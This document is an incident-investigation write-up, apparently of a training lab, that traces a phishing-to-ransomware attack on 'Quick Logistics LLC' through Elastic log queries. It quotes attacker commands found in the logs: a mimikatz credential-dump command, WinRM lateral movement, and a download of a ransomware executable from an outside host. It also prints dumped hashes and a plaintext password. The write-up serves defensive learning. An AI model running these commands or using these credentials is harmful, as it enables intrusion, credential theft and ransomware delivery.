# 🔍 Quick Logistics LLC – Endpoint Compromise Investigation (Elastic Stack)

---

# 📌 Context

Quick Logistics LLC experienced a targeted phishing attack that led to the compromise of an employee workstation and eventual domain-level impact.

The investigation was conducted using **Elastic Stack logs**, covering activity between **August 29–30, 2023**.

At the beginning of the investigation, there was no clarity about:

* How the attacker gained access
* What payload was executed
* Whether persistence was established
* How far the attacker moved inside the network
* Whether domain-level compromise occurred

This investigation was performed **entirely based on logs**, without assumptions.

---

# 🎯 Objective

The goals of this investigation were:

* Identify the **initial infection vector**
* Trace **payload execution and persistence**
* Detect **Command & Control (C2) communication**
* Identify **privilege escalation techniques**
* Detect **credential dumping activity**
* Track **lateral movement across machines**
* Identify **domain compromise (DCSync)**
* Detect **final attacker objective (ransomware)**

---

# 🧠 Investigation Approach

When I opened the logs in Elastic, I faced the same issue as before:

```text
Too many logs  
Too many fields  
No clear starting point
```

Instead of randomly searching, I followed a structured approach:

* Start from **known evidence (attachment + file)**
* Focus on **process execution**
* Use **parent-child process relationships**
* Reduce noise using **filters (user + host + time)**
* Avoid guessing → rely only on **log evidence**

---

# 🔎 Evidence-Based Investigation

---

# 🟥 Stage 1: Initial Access (Phishing → ISO Attachment)

The investigation started from the **email attachment found in Downloads**.

I observed:

* An **ISO file present in Downloads**
* A file inside the ISO payload

🔍 Insight:

```text
ISO files are commonly used to bypass security controls
```

Although logs did not explicitly say “ISO opened”, I inferred:

```text
ISO → opened → internal file executed
```

Because:

* Execution events followed immediately after
* LNK/MSHTA behavior observed

---

# 🟥 Stage 2: Execution Chain (LNK → mshta.exe)

I searched for process execution and found:

```text
process.name = mshta.exe
```

🔍 Analysis:

* `mshta.exe` is a legitimate Windows binary
* Rare in normal user activity
* Commonly used for **fileless malware execution**

🧠 Key Observation:

```text
User rarely runs mshta manually  
→ must be triggered by another file
```

➡️ This indicated a **malicious execution chain**

---

# 🟥 Stage 3: Payload Staging (xcopy → review.dat)

Instead of guessing next steps, I traced **child processes of mshta**.

```kql
process.parent.name : "mshta.exe"
```

💥 Found:

```text
xcopy.exe → review.dat → Temp folder
```

🔍 Interpretation:

* File copied to Temp directory
* Unusual filename (`.dat`)
* Indicates **payload staging**

⚠️ Learning:

```text
Never guess next process  
→ always trace child processes
```

---

# 🟥 Stage 4: Payload Execution (rundll32)

Instead of searching for rundll32 directly, I searched:

```kql
file.name : "review.dat"
```

💥 Found:

```text
rundll32.exe review.dat,DllRegisterServer
```

🔍 Interpretation:

* `.dat` file used as DLL
* Executed via legitimate binary
* Confirms **malware execution**

---

# 🟥 Stage 5: Persistence (Scheduled Task)

Instead of assuming persistence method, I:

* Checked activity after execution
* Focused on PowerShell logs

```kql
process.name : "powershell.exe"
```

💥 Found:

```text
New-ScheduledTask → TaskName: Review
```

🔍 Interpretation:

```text
Malware ensured persistence after reboot
```

---

# 🟥 Stage 6: Command & Control (C2)

I searched network activity:

```kql
destination.ip : *
```

Filtered unusual IP:

```text
165.232.170.151:80
```

🔍 Key Evidence:

* Connection initiated by `rundll32.exe`
* Repeated connections observed

🧠 Conclusion:

```text
Repeated connections → beaconing  
→ confirmed C2 communication
```

---

# 🟥 Stage 7: Privilege Escalation (fodhelper.exe)

Instead of guessing, I:

* Followed timeline after C2
* Observed unusual processes

💥 Found:

```text
process.name = fodhelper.exe
```

🔍 Research confirmed:

* Known **UAC bypass technique**
* Executes with elevated privileges

🧠 Conclusion:

```text
Attacker gained admin access
```

---

# 🟥 Stage 8: Credential Dumping (Mimikatz)

I searched:

```kql
process.command_line : "*sekurlsa*"
```

💥 Found:

```text
sekurlsa::logonpasswords
```

🔍 Interpretation:

* LSASS memory accessed
* Credentials extracted

💥 Output:

```text
itadmin:F84769D250EB95EB2D7D8B4A1C5613F2
```

---

# 🟥 Stage 9: File Share Enumeration

Instead of assuming behavior, I tracked:

```kql
user.name : "itadmin"
```

Too many logs → applied filtering:

```kql
user.name : "itadmin" AND process.command_line : "*\\\\*"
```

💥 Found:

```text
cat \\WKSTN-1327\...\IT_Automation.ps1
```

🔍 Interpretation:

```text
Attacker reading remote script  
→ credential hunting
```

---

# 🟥 Stage 10: Credential Discovery (Plaintext)

Inside script:

```text
QUICKLOGISTICS\allan.smith:Tr1ckyP@ssw0rd987
```

🧠 Insight:

```text
Scripts often contain hardcoded credentials
```

---

# 🟥 Stage 11: Lateral Movement

Observed:

```text
Invoke-Command -ComputerName WKSTN-1327
```

On second machine:

```text
parent process = wsmprovhost.exe
```

🔍 Interpretation:

```text
WinRM used → remote execution  
→ lateral movement confirmed
```

---

# 🟥 Stage 12: Credential Dumping (Second Machine)

On WKSTN-1327:

```kql
host.name : "WKSTN-1327" AND process.command_line : "*sekurlsa*"
```

💥 Found:

```text
administrator:00f80f2538dcb54e7adc715c0e7091ec
```

---

# 🟥 Stage 13: Domain Controller Activity

Instead of assuming, I tracked:

```kql
user.name : "administrator"
```

💥 Found:

```text
host.name changed → DC01
```

🔍 Insight:

```text
New machine + admin user = high impact
```

---

# 🟥 Stage 14: DCSync Detection

Instead of searching “DCSync”, I:

* Looked for credential activity on DC
* Removed known users

Remaining:

```text
backupda
```

🧠 Interpretation:

```text
Multiple user hashes accessed  
→ replication-like behavior  
→ DCSync attack inferred
```

---

# 🟥 Stage 15: Ransomware Download

Searched:

```kql
process.command_line : "*http*"
```

💥 Found:

```text
iwr http://ff.sillytechninja.io/ransomboogey.exe
```

🔍 Interpretation:

```text
Executable download  
→ final payload (ransomware)
```

---

# 💀 Full Attack Chain

```text
Phishing → ISO → LNK → mshta  
→ xcopy → rundll32  
→ persistence (scheduled task)  
→ C2 beaconing  
→ UAC bypass (fodhelper)  
→ mimikatz (dump creds)  
→ lateral movement (WinRM)  
→ credential harvesting  
→ domain controller access  
→ DCSync  
→ ransomware deployment 💀
```

---

# ⚠️ Challenges & Mistakes

* Initially overwhelmed by logs
* Tried searching random processes (wrong approach)
* Only used single filters (user only) → too many logs
* Did not use timeline correlation early
* Missed importance of parent-child processes initially

---

# 🧠 Key Learnings

* Always start from **confirmed malicious event**
* Use **parent → child tracing**
* Never guess processes → follow **evidence**
* Use **layered filtering (user + host + behavior)**
* Look for **patterns, not keywords**
* Investigation is **iterative, not linear**
* Behavior > Signatures

---

# 🛠️ Tools Used

* Elastic Stack (Kibana)
* Endpoint Logs
* Process Analysis
* External research (MITRE techniques, Windows internals)

---

# 🚀 Conclusion

This investigation demonstrated how a single phishing email led to:

* Full endpoint compromise
* Credential theft
* Lateral movement
* Domain takeover
* Ransomware deployment

💀 **Complete kill chain executed successfully by attacker**

---

# 🧠 Final Insight

```text
SOC analysis is not about searching logs  
→ It is about building a story from evidence
```
